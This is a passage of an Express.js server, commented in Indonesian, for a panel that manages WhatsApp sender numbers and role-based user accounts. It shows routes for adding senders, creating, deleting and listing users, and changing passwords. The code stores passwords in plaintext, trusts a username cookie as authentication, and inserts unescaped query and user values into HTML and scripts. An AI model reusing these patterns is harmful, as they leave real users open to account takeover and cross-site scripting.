    if (err) {
      console.error("❌ Gagal membaca file sender.html:", err);
      return res.status(500).send("File sender.html tidak ditemukan");
    }
    res.send(html);
  });
});

// API untuk mendapatkan daftar sender user
app.get("/api/my-senders", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const userSessions = loadUserSessions();
  const userSenders = userSessions[username] || [];

  res.json({
    success: true,
    senders: userSenders,
    total: userSenders.length
  });
});

// SSE endpoint untuk events real-time
app.get("/api/events", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;

  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Access-Control-Allow-Origin': '*',
  });

  // Simpan response object untuk user ini
  userEvents.set(username, res);

  // Kirim heartbeat setiap 30 detik
  const heartbeat = setInterval(() => {
    try {
      res.write(': heartbeat\n\n');
    } catch (err) {
      clearInterval(heartbeat);
    }
  }, 30000);

  // Cleanup saat connection close
  req.on('close', () => {
    clearInterval(heartbeat);
    userEvents.delete(username);
  });

  // Kirim event connection established
  res.write(`data: ${JSON.stringify({ type: 'connected', message: 'Event stream connected' })}\n\n`);
});

// API untuk menambah sender baru
app.post("/api/add-sender", requireAuth, async (req, res) => {
  const username = req.cookies.sessionUser;
  const { number } = req.body;

  if (!number) {
    return res.json({ success: false, error: "Nomor tidak boleh kosong" });
  }

  // Validasi nomor
  const cleanNumber = number.replace(/\D/g, '');
  if (!cleanNumber.startsWith('62')) {
    return res.json({ success: false, error: "Nomor harus diawali dengan 62" });
  }

  if (cleanNumber.length < 10) {
    return res.json({ success: false, error: "Nomor terlalu pendek" });
  }

  try {
    console.log(`[API] User ${username} adding sender: ${cleanNumber}`);
    const sessionDir = userSessionPath(username, cleanNumber);

    // Langsung jalankan koneksi di background
    connectToWhatsAppUser(username, cleanNumber, sessionDir)
      .then((sock) => {
        console.log(`[${username}] ✅ Sender ${cleanNumber} connected successfully`);
        // Simpan socket ke map jika diperlukan
      })
      .catch((error) => {
        console.error(`[${username}] ❌ Failed to connect sender ${cleanNumber}:`, error.message);
      });

    res.json({
      success: true,
      message: "Proses koneksi dimulai! Silakan tunggu notifikasi kode pairing.",
      number: cleanNumber,
      note: "Kode pairing akan muncul di halaman ini dalam beberapa detik..."
    });

  } catch (error) {
    console.error(`[API] Error adding sender for ${username}:`, error);
    res.json({
      success: false,
      error: "Terjadi error saat memproses sender: " + error.message
    });
  }
});

// API untuk menghapus sender
app.post("/api/delete-sender", requireAuth, async (req, res) => {
  const username = req.cookies.sessionUser;
  const { number } = req.body;

  if (!number) {
    return res.json({ success: false, error: "Nomor tidak boleh kosong" });
  }

  try {
    const userSessions = loadUserSessions();
    if (userSessions[username]) {
      userSessions[username] = userSessions[username].filter(n => n !== number);
      saveUserSessions(userSessions);
    }

    // Hapus folder session
    const sessionDir = userSessionPath(username, number);
    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true });
    }

    res.json({
      success: true,
      message: "Sender berhasil dihapus",
      number: number
    });
  } catch (error) {
    res.json({
      success: false,
      error: error.message
    });
  }
});

// ============= User Add ================== \\
// GANTI kode route /adduser yang ada dengan yang ini:
app.post("/adduser", requireAuth, (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser) {
      return res.redirect("/login?msg=User tidak ditemukan");
    }

    const sessionRole = currentUser.role || 'user';
    const { username: newUsername, password, role, durasi } = req.body;

    // Validasi input lengkap
    if (!newUsername || !password || !role || !durasi) {
      return res.send(`
        <script>
          alert("❌ Lengkapi semua kolom.");
          window.history.back();
        </script>
      `);
    }

    // Validasi durasi
    const durasiNumber = parseInt(durasi);
    if (isNaN(durasiNumber) || durasiNumber <= 0) {
      return res.send(`
        <script>
          alert("❌ Durasi harus angka positif.");
          window.history.back();
        </script>
      `);
    }

    // Cek hak akses berdasarkan role pembuat
    if (sessionRole === "user") {
      return res.send(`
        <script>
          alert("🚫 User tidak bisa membuat akun.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "reseller" && role !== "user") {
      return res.send(`
        <script>
          alert("🚫 Reseller hanya boleh membuat user biasa.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "admin" && role === "admin") {
      return res.send(`
        <script>
          alert("🚫 Admin tidak boleh membuat admin lain.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "admin" && role === "owner") {
      return res.send(`
        <script>
          alert("🚫 Admin tidak boleh membuat owner.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "reseller" && role === "owner") {
      return res.send(`
        <script>
          alert("🚫 Reseller tidak boleh membuat owner.");
          window.history.back();
        </script>
      `);
    }

    // Cek username sudah ada
    if (users.some(u => u.username === newUsername)) {
      return res.send(`
        <script>
          alert("❌ Username '${newUsername}' sudah terdaftar.");
          window.history.back();
        </script>
      `);
    }

    // Validasi panjang username dan password
    if (newUsername.length < 3) {
      return res.send(`
        <script>
          alert("❌ Username minimal 3 karakter.");
          window.history.back();
        </script>
      `);
    }

    if (password.length < 4) {
      return res.send(`
        <script>
          alert("❌ Password minimal 4 karakter.");
          window.history.back();
        </script>
      `);
    }

    const expired = Date.now() + (durasiNumber * 86400000);

    // Buat user baru
    const newUser = {
      username: newUsername,
      key: password,
      expired,
      role,
      telegram_id: "",
      isLoggedIn: false
    };

    users.push(newUser);

    // Simpan dan cek hasilnya
    const saveResult = saveUsers(users);

    if (!saveResult) {
      throw new Error("Gagal menyimpan data user ke file system");
    }

    // Redirect ke userlist dengan pesan sukses
    return res.redirect("/userlist?msg=User " + newUsername + " berhasil dibuat");

  } catch (error) {
    console.error("❌ Error in /adduser:", error);
    return res.send(`
      <script>
        alert("❌ Terjadi error saat menambahkan user: ${error.message}");
        window.history.back();
      </script>
    `);
  }
});

// untuk ubah pw akun

// Contoh middleware session (sesuaikan dengan yang Anda pakai, misal: express-session)
app.get('/edit-key', (req, res) => {
  // 1. Cek apakah session ada. Jika tidak, arahkan ke login.
  // Ini penting agar 'username' tidak menjadi "Guest" yang tidak ada di user.json
  if (!req.session?.username) {
    return res.redirect('/login?msg=Silakan login terlebih dahulu');
  }

  const username = req.session.username;
  const role = req.session.role || "user";

  res.send(`
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Change Password - DIGITAL CORE</title>
    <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Poppins:wght@300;400;600&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
    <style>
        :root {
            --primary: #32CD32; 
            --secondary: #228B22; 
            --accent: #adff2f; 
            --bg-dark: #050505;
            --glass-border: rgba(255, 255, 255, 0.1);
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Poppins', sans-serif;
            background: var(--bg-dark);
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow-x: hidden;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(50, 205, 50, 0.05) 0%, transparent 40%),
                radial-gradient(circle at 90% 80%, rgba(173, 255, 47, 0.05) 0%, transparent 40%);
        }

        #particles { position: fixed; top: 0; left: 0; right: 0; bottom: 0; z-index: 0; opacity: 0.4; }
        .content { position: relative; z-index: 2; width: 100%; max-width: 450px; padding: 20px; }

        .header { text-align: center; margin-bottom: 30px; }
        .header h2 {
            font-family: 'Orbitron', sans-serif;
            font-size: 24px;
            background: linear-gradient(to right, #fff, var(--primary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: 3px;
            margin-bottom: 5px;
        }

        .form-container {
            background: rgba(15, 15, 15, 0.8);
            border: 1px solid var(--glass-border);
            padding: 35px;
            border-radius: 25px;
            backdrop-filter: blur(15px);
            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
            border-top: 2px solid var(--primary);
        }

        .role-display {
            display: inline-block;
            padding: 5px 15px;
            border-radius: 6px;
            font-size: 10px;
            font-weight: 800;
            text-transform: uppercase;
            margin-bottom: 15px;
            letter-spacing: 1px;
            background: ${role === 'owner' ? 'linear-gradient(45deg, #FFD700, #FFA500)' :
      role === 'admin' ? 'linear-gradient(45deg, #FF4B2B, #FF416C)' :
        'linear-gradient(45deg, #32CD32, #228B22)'
    };
            color: ${role === 'owner' ? '#000' : '#fff'};
            box-shadow: 0 0 15px ${role === 'owner' ? '#FFD70044' : '#32CD3244'};
        }

        .form-group { margin-bottom: 22px; }
        label { display: block; margin-bottom: 10px; font-size: 11px; color: #888; letter-spacing: 1px; font-weight: 600; }
        label i { color: var(--primary); margin-right: 8px; }

        input {
            width: 100%;
            padding: 14px 18px;
            border-radius: 12px;
            border: 1px solid rgba(255,255,255,0.08);
            background: rgba(255,255,255,0.03);
            color: #fff;
            outline: none;
            transition: all 0.3s ease;
            font-family: 'Poppins', sans-serif;
        }

        input:focus { 
            border-color: var(--primary); 
            background: rgba(50, 205, 50, 0.05);
            box-shadow: 0 0 15px rgba(50, 205, 50, 0.1);
        }

        .btn-update {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 12px;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            color: #fff;
            font-family: 'Orbitron', sans-serif;
            font-size: 13px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.4s;
            margin-top: 10px;
            letter-spacing: 1px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .btn-update:hover { 
            transform: translateY(-3px); 
            box-shadow: 0 10px 25px rgba(50, 205, 50, 0.4);
            filter: brightness(1.1);
        }

        .back-link {
            display: block;
            text-align: center;
            margin-top: 25px;
            color: #555;
            text-decoration: none;
            font-size: 11px;
            font-family: 'Orbitron', sans-serif;
            transition: 0.3s;
        }
        .back-link:hover { color: var(--primary); }
    </style>
</head>
<body>
    <div id="particles"></div>
    <div class="content">
        <div class="header">
            <h2>CORE SECURITY</h2>
            <p style="font-size: 11px; color: #666; font-family: 'Orbitron';">AUTHENTICATION OVERRIDE</p>
        </div>

        <div class="form-container">
            <div style="text-align: center; border-bottom: 1px solid rgba(255,255,255,0.05); margin-bottom: 25px; padding-bottom: 10px;">
                <div class="role-display">${role}</div>
                <h3 style="margin-bottom: 15px; font-family: 'Rajdhani'; letter-spacing: 3px; color: #eee;">
                    USR: <span style="color: var(--primary)">${username.toUpperCase()}</span>
                </h3>
            </div>

            <form action="/update-key" method="POST">
                <div class="form-group">
                    <label><i class="fas fa-shield-alt"></i> CURRENT ACCESS KEY</label>
                    <input type="password" name="oldKey" placeholder="••••••••" required autocomplete="current-password">
                </div>

                <div class="form-group">
                    <label><i class="fas fa-key"></i> NEW ACCESS KEY</label>
                    <input type="text" name="newKey" placeholder="Enter new sequence" required autocomplete="new-password">
                </div>

                <button type="submit" class="btn-update">
                    <i class="fas fa-sync-alt"></i> UPDATE DATABASE
                </button>
            </form>

            <a href="/dashboard" class="back-link"><i class="fas fa-arrow-left"></i> RETURN TO TERMINAL</a>
        </div>
    </div>

    <script>
        $(document).ready(function() {
            $('#particles').particleground({
                dotColor: '#1a4a1a',
                lineColor: '#1a4a1a',
                density: 12000,
                proximity: 100
            });
        });
    </script>
</body>
</html>
    `);
});

const userFilePath = path.join(__dirname, 'database', 'user.json');

app.post('/update-key', (req, res) => {
  // Gunakan .trim() untuk membersihkan spasi di awal/akhir input
  const oldKey = req.body.oldKey ? req.body.oldKey.trim() : "";
  const newKey = req.body.newKey ? req.body.newKey.trim() : "";
  const username = req.session?.username;

  // Proteksi jika session hilang
  if (!username) {
    return res.send("Sesi berakhir. Silakan login kembali.");
  }

  let users = [];
  try {
    const data = fs.readFileSync(userFilePath, 'utf8');
    users = JSON.parse(data);
  } catch (err) {
    console.error("Gagal membaca file user.json:", err);
  }

  // DEBUG: Cek di terminal apakah data yang dicari sesuai
  // console.log(`Memeriksa User: ${username} | Input Key: ${oldKey}`);

  // Validasi: pastikan username cocok dan key cocok (gunakan trim juga pada data DB)
  const userIndex = users.findIndex(u =>
    u.username.toLowerCase() === username.toLowerCase() &&
    u.key.toString().trim() === oldKey
  );

  let status, message, icon, themeColor;

  if (userIndex !== -1) {
    // --- PROSES UPDATE ---
    users[userIndex].key = newKey;

    try {
      fs.writeFileSync(userFilePath, JSON.stringify(users, null, 2), 'utf8');

      status = "SUCCESS";
      message = "Database core telah disinkronisasi. Key baru telah diaktifkan.";
      icon = "fa-check-double";
      themeColor = "#32CD32";
    } catch (err) {
      status = "SYSTEM ERROR";
      message = "Gagal menulis ke database. Periksa izin akses file.";
      icon = "fa-microchip";
      themeColor = "#ffa500";
    }
  } else {
    // --- PROSES GAGAL ---
    status = "ACCESS DENIED";
    message = "Password lama salah. Identitas gagal diverifikasi oleh sistem.";
    icon = "fa-exclamation-triangle";
    themeColor = "#ff4b2b";
  }

  res.send(`
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>${status} - DIGITAL CORE</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
    <style>
        :root { --primary: ${themeColor}; --bg-dark: #050505; }
        body { font-family: 'Poppins', sans-serif; background: var(--bg-dark); color: #fff; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; margin: 0; }
        #particles { position: fixed; top: 0; left: 0; right: 0; bottom: 0; z-index: 0; opacity: 0.2; }
        .content { position: relative; z-index: 2; width: 100%; max-width: 450px; padding: 20px; }
        .status-card { background: rgba(10, 10, 10, 0.85); border: 1px solid rgba(255,255,255,0.1); padding: 40px; border-radius: 25px; backdrop-filter: blur(20px); text-align: center; border-top: 3px solid var(--primary); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .icon-box { width: 70px; height: 70px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 35px; color: var(--primary); border: 2px solid var(--primary); border-radius: 50%; box-shadow: 0 0 15px var(--primary); }
        h2 { font-family: 'Orbitron', sans-serif; font-size: 18px; margin-bottom: 15px; letter-spacing: 3px; color: var(--primary); }
        p { color: #ccc; font-size: 13px; line-height: 1.6; margin-bottom: 30px; }
        .btn-action { display: inline-block; width: 100%; padding: 14px; background: transparent; color: var(--primary); border: 1px solid var(--primary); text-decoration: none; border-radius: 8px; font-family: 'Orbitron', sans-serif; font-weight: bold; font-size: 11px; transition: 0.3s; text-transform: uppercase; text-align: center; }
        .btn-action:hover { background: var(--primary); color: #000; box-shadow: 0 0 20px var(--primary); }
    </style>
</head>
<body>
    <div id="particles"></div>
    <div class="content">
        <div class="status-card">
            <div class="icon-box"><i class="fas ${icon}"></i></div>
            <h2>${status}</h2>
            <p>${message}</p>
            <a href="${userIndex !== -1 ? '/dashboard' : '/edit-key'}" class="btn-action">
                <i class="fas ${userIndex !== -1 ? 'fa-home' : 'fa-redo'}"></i> 
                ${userIndex !== -1 ? 'Return to System' : 'Retry Verification'}
            </a>
        </div>
    </div>
    <script>
        $(document).ready(function() {
            $('#particles').particleground({ dotColor: '${themeColor}', lineColor: '${themeColor}', density: 12000 });
        });
    </script>
</body>
</html>
    `);
});


// TAMBAHKAN route ini SEBELUM route POST /adduser
app.get("/adduser", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const role = currentUser.role || 'user';

  // Hanya owner, admin, reseller yang bisa akses
  if (!["owner", "admin", "reseller"].includes(role)) {
    return res.send("🚫 Akses ditolak. Hanya Owner, Admin, dan Reseller yang bisa menambah user.");
  }

  // Tentukan opsi role berdasarkan role current user
  let roleOptions = "";
  if (role === "owner") {
    roleOptions = `
      <option value="user">User</option>
      <option value="reseller">Reseller</option>
      <option value="admin">Admin</option>
      <option value="owner">Owner</option>
    `;
  } else if (role === "admin") {
    roleOptions = `
      <option value="user">User</option>
      <option value="reseller">Reseller</option>
    `;
  } else {
    // Reseller hanya bisa buat user biasa
    roleOptions = `<option value="user">User</option>`;
  }

  const html = `
  <!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Tambah User - DIGITAL CORE</title>
    <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Poppins:wght@300;400;600&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
    <style>
        /* Perubahan Tema ke Lime Apple Green */
        :root {
            --primary: #32CD32; /* Lime Green */
            --secondary: #228B22; /* Forest Green */
            --accent: #adff2f; /* Green Yellow */
            --bg-dark: #050505;
            --glass: rgba(255, 255, 255, 0.03);
            --glass-border: rgba(255, 255, 255, 0.1);
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: 'Poppins', sans-serif;
            background: var(--bg-dark);
            color: #fff;
            min-height: 100vh;
            padding: 40px 20px;
            position: relative;
            overflow-y: auto;
            overflow-x: hidden;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(50, 205, 50, 0.05) 0%, transparent 40%),
                radial-gradient(circle at 90% 80%, rgba(173, 255, 47, 0.05) 0%, transparent 40%);
        }

        #particles {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            z-index: 0;
            opacity: 0.5;
        }

        .content {
            position: relative;
            z-index: 2;
            max-width: 550px;
            margin: 0 auto;
        }

        /* Header Mewah */
        .header {
            text-align: center;
            margin-bottom: 40px;
            padding: 20px;
        }
        
        .header h2 {
            font-family: 'Orbitron', sans-serif;
            font-size: 28px;
            font-weight: 700;
            background: linear-gradient(to right, #fff, var(--primary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-transform: uppercase;
            letter-spacing: 4px;
            margin-bottom: 15px;
            filter: drop-shadow(0 0 15px rgba(50, 205, 50, 0.3));
        }

        .header p {
            color: #888;
            font-size: 14px;
            letter-spacing: 1px;
            font-weight: 300;
        }

        /* Form Container - Glassmorphism Ultra */
        .form-container {
            background: rgba(15, 15, 15, 0.6);
            border: 1px solid var(--glass-border);
            padding: 40px;
            border-radius: 30px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            position: relative;
            overflow: hidden;
        }

        .form-container::before {
            content: "";
            position: absolute;
            top: 0; left: 0; width: 100%; height: 2px;
            background: linear-gradient(90deg, transparent, var(--primary), transparent);
        }

        /* User info info */
        .user-info {
            background: rgba(255, 255, 255, 0.03);
            padding: 20px;
            border-radius: 20px;
            margin-bottom: 30px;
            border: 1px solid rgba(255, 255, 255, 0.05);
            transition: 0.3s;
        }
        
        .user-info:hover {
            border-color: var(--primary);
            background: rgba(50, 205, 50, 0.02);
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
            font-size: 13px;
        }

        .info-label {
            color: #777;
            font-weight: 400;
        }

        .info-value {
            color: #fff;
            font-weight: 600;
            font-family: 'Rajdhani', sans-serif;
            letter-spacing: 1px;
        }

        /* Role Badges */
        .role-badge {
            display: inline-block;
            padding: 5px 15px;
            border-radius: 8px;
            font-size: 10px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
        }

        .role-owner { background: linear-gradient(45deg, #FFD700, #FFA500); color: #000; box-shadow: 0 0 15px rgba(255, 215, 0, 0.3); }
        .role-admin { background: linear-gradient(45deg, #FF4B2B, #FF416C); color: #fff; box-shadow: 0 0 15px rgba(255, 75, 43, 0.3); }
        .role-reseller { background: linear-gradient(45deg, #32CD32, #228B22); color: #fff; box-shadow: 0 0 15px rgba(50, 205, 50, 0.3); }
        .role-user { background: linear-gradient(45deg, #adff2f, #32CD32); color: #fff; box-shadow: 0 0 15px rgba(56, 239, 125, 0.3); }

        /* Form Controls */
        .form-group { margin-bottom: 25px; }

        label {
            display: block;
            margin-bottom: 10px;
            font-weight: 500;
            color: #aaa;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1.5px;
        }

        label i { color: var(--primary); margin-right: 8px; }

        input, select {
            width: 100%;
            padding: 16px 20px;
            border-radius: 15px;
            border: 1px solid rgba(255,255,255,0.08);
            background: rgba(255, 255, 255, 0.05);
            color: #fff;
            font-size: 14px;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            outline: none;
        }

        input:focus, select:focus {
            background: rgba(255, 255, 255, 0.08);
            border-color: var(--primary);
            box-shadow: 0 0 20px rgba(50, 205, 50, 0.2);
            transform: scale(1.02);
        }

        /* Buttons */
        .button-group {
            display: flex;
            gap: 15px;
            margin-top: 35px;
        }

        .btn {
            flex: 1;
            padding: 18px;
            border: none;
            border-radius: 15px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'Orbitron', sans-serif;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 2px;
            text-align: center;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .btn-save {
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            color: #fff;
            box-shadow: 0 10px 20px rgba(50, 205, 50, 0.2);
        }

        .btn-save:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(50, 205, 50, 0.4);
            filter: brightness(1.1);
        }

        .btn-back {
            background: rgba(255, 255, 255, 0.05);
            color: #fff;
            border: 1px solid rgba(255,255,255,0.1);
        }
        
        .btn-back:hover {
            background: rgba(255, 255, 255, 0.1);
            border-color: #fff;
            transform: translateY(-3px);
        }

        /* Info Boxes */
        .permission-info {
            background: rgba(50, 205, 50, 0.05);
            padding: 15px;
            border-radius: 15px;
            font-size: 12px;
            color: var(--primary);
            text-align: center;
            margin-top: 25px;
            border: 1px solid rgba(50, 205, 50, 0.2);
        }

        .permission-note {
            background: rgba(255, 255, 255, 0.02);
            padding: 15px;
            border-radius: 15px;
            font-size: 11px;
            color: #666;
            text-align: center;
            margin-top: 20px;
            border: 1px solid rgba(255,255,255,0.05);
            line-height: 1.6;
        }

        /* Animations */
        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .form-container { 
            animation: fadeInUp 0.8s cubic-bezier(0.23, 1, 0.32, 1); 
        }

        @media (max-width: 500px) {
            body { padding: 20px 15px; }
            .form-container { padding: 30px 20px; }
            .header h2 { font-size: 22px; }
            .button-group { flex-direction: column; }
        }
    </style>
</head>
<body>
    <div id="particles"></div>

    <div class="content">
        <div class="header">
            <h2><i class="fas fa-user-plus"></i> ADD USER</h2>
            <p>Access Control & User Provisioning</p>
        </div>

        <div class="form-container">
            <div class="user-info">
                <div class="info-row">
                    <span class="info-label">Active Session:</span>
                    <span class="info-value"><i class="fas fa-circle" style="color:var(--primary); font-size:8px; margin-right:5px;"></i> ${username}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Privilege Level:</span>
                    <span class="info-value">
                        <span class="role-badge role-${role}">
                            ${role.charAt(0).toUpperCase() + role.slice(1)}
                        </span>
                    </span>
                </div>
            </div>

            <form method="POST" action="/adduser">
                <div class="form-group">
                    <label for="username"><i class="fas fa-id-badge"></i> Username</label>
                    <input type="text" id="username" name="username" placeholder="Target identity name" required>
                </div>

                <div class="form-group">
                    <label for="password"><i class="fas fa-fingerprint"></i> Password / Key</label>
                    <input type="text" id="password" name="password" placeholder="Secure access key" required>
                </div>

                <div class="form-group">
                    <label for="role"><i class="fas fa-shield-halved"></i> Assign Role</label>
                    <select id="role" name="role" required>
                        ${roleOptions}
                    </select>
                </div>

                <div class="form-group">
                    <label for="durasi"><i class="fas fa-hourglass-half"></i> Duration (Days)</label>
                    <input type="number" id="durasi" name="durasi" min="1" max="365" placeholder="30" value="30" required>
                </div>

                <div class="permission-info">
                    <i class="fas fa-shield-check"></i> 
                    <strong>Access Protocol:</strong> 
                    ${role === 'reseller' ? 'Standard user creation only' :
      role === 'admin' ? 'Elevated privileges (Reseller & User)' :
        'Full root authority enabled'}
                </div>

                <div class="button-group">
                    <button type="submit" class="btn btn-save">
                        <i class="fas fa-bolt"></i> EXECUTE CREATE
                    </button>
                    
                    <a href="/dashboard" class="btn btn-back">
                        <i class="fas fa-times"></i> ABORT
                    </a>
                </div>
            </form>
                
            <div class="permission-note">
                <i class="fas fa-info-circle"></i>
                Please review configuration. Created identities are immutable and cannot be purged by the creator.
            </div>
        </div>
    </div>

    <script>
        $(document).ready(function() {
            $('#particles').particleground({
                dotColor: '#1a4a1a', /* Sesuai tema hijau */
                lineColor: '#1a4a1a',
                minSpeedX: 0.1,
                maxSpeedX: 0.4,
                density: 10000,
                particleRadius: 3,
                curvedLines: true,
                proximity: 110
            });

            document.getElementById('role').addEventListener('change', function() {
                const selectedRole = this.value;
                const badge = document.querySelector('.user-info .role-badge');
                if (badge) {
                    badge.className = \`role-badge role-\${selectedRole}\`;
                    badge.textContent = selectedRole.charAt(0).toUpperCase() + selectedRole.slice(1);
                }
            });
        });
    </script>
</body>
</html>
  `;
  res.send(html);
});

app.post("/hapususer", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const sessionRole = currentUser.role || 'user';
  const sessionUsername = username;
  const { username: targetUsername } = req.body;

  const targetUser = users.find(u => u.username === targetUsername);

  if (!targetUser) {
    return res.send("❌ User tidak ditemukan.");
  }

  // 🔒🔒🔒 PROTEKSI AKSES YANG LEBIH KETAT 🔒🔒🔒

  // 1. Tidak bisa hapus diri sendiri
  if (sessionUsername === targetUsername) {
    return res.send("❌ Tidak bisa hapus akun sendiri.");
  }

  // 2. Reseller hanya boleh hapus user biasa
  if (sessionRole === "reseller" && targetUser.role !== "user") {
    return res.send("❌ Reseller hanya boleh hapus user biasa.");
  }

  // 3. Admin tidak boleh hapus admin lain ATAU owner
  if (sessionRole === "admin") {
    if (targetUser.role === "admin") {
      return res.send("❌ Admin tidak bisa hapus admin lain.");
    }
    if (targetUser.role === "owner") {
      return res.send("❌ Admin tidak bisa hapus owner.");
    }
  }

  // 4. Owner bisa hapus semua kecuali diri sendiri

  // Lanjut hapus
  const filtered = users.filter(u => u.username !== targetUsername);
  saveUsers(filtered);

  // Redirect ke userlist dengan pesan sukses
  res.redirect("/userlist?msg=User " + targetUsername + " berhasil dihapus");
});

app.get("/userlist", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const role = currentUser.role || 'user';
  const message = req.query.msg || ""; // Ambil pesan dari query parameter

  // Hanya owner, admin, reseller yang bisa akses
  if (!["owner", "admin", "reseller"].includes(role)) {
    return res.send("🚫 Akses ditolak. Hanya Owner, Admin, dan Reseller yang bisa mengakses user list.");
  }

  const tableRows = users.map(user => {
    const expired = new Date(user.expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "numeric", month: "2-digit", day: "2-digit",
      hour: "2-digit", minute: "2-digit"
    });

    const now = Date.now();
    const daysRemaining = Math.max(0, Math.ceil((user.expired - now) / 86400000));

    // Tentukan apakah user ini boleh diedit oleh current user
    let canEdit = true;

    if (user.username === username) {
      canEdit = false; // Tidak bisa edit diri sendiri
    } else if (role === "reseller" && user.role !== "user") {
      canEdit = false; // Reseller hanya bisa edit user
    } else if (role === "admin" && (user.role === "admin" || user.role === "owner")) {
      canEdit = false; // Admin tidak bisa edit admin lain atau owner
    }

    const editButton = canEdit
      ? `<a href="/edituser?username=${encodeURIComponent(user.username)}" class="btn-edit">
           <i class="fas fa-edit"></i> Edit
         </a>`
      : `<span class="btn-edit disabled" style="opacity: 0.5; cursor: not-allowed;">
           <i class="fas fa-ban"></i> Tidak Bisa Edit
         </span>`;

    return `
      <tr>
        <td>${user.username}</td>
        <td>
          <span class="role-badge role-${user.role || 'user'}">
            ${(user.role || 'user').charAt(0).toUpperCase() + (user.role || 'user').slice(1)}
          </span>
        </td>
        <td>${expired}</td>
        <td>${daysRemaining} hari</td>
        <td>${editButton}</td>
      </tr>
    `;
  }).join("");

  // Tambahkan notifikasi pesan di HTML
  const messageHtml = message ? `
    <div style="
      background: rgba(76, 175, 80, 0.2);
      border: 1px solid #4CAF50;
      color: #4CAF50;
      padding: 15px;
      border-radius: 8px;
      margin-bottom: 20px;
      text-align: center;
    ">
      <i class="fas fa-check-circle"></i> ${message}
    </div>
  ` : '';

  // Tombol Tambah User Baru
  const addUserButton = `
    <div style="text-align: center; margin: 20px 0;">
